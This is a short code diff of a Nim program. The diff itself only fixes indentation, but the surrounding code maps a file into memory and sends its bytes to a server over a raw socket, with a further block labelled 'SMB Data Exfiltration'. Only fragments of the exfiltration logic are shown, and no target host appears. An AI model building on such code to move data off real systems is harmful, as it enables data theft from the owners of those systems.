@@ -276,7 +276,7 @@ when isMainModule:
     var mappedData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
     echo "\n[!] Mapped Data at: 0x", repr mappedData, " - Size: ", size
     
-if useRawSocket:
+    if useRawSocket:
         var dataPointer = mappedData
         #var dumpSeq: seq[byte] = @[]
 
@@ -311,7 +311,7 @@ if useRawSocket:
             echo "[!] Bytes Sent (", bytesSent, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"
         
         socket.close()
-
+    
     if useSMB:
         # SMB Data Exfiltration
         var dwBytesWritten: DWORD
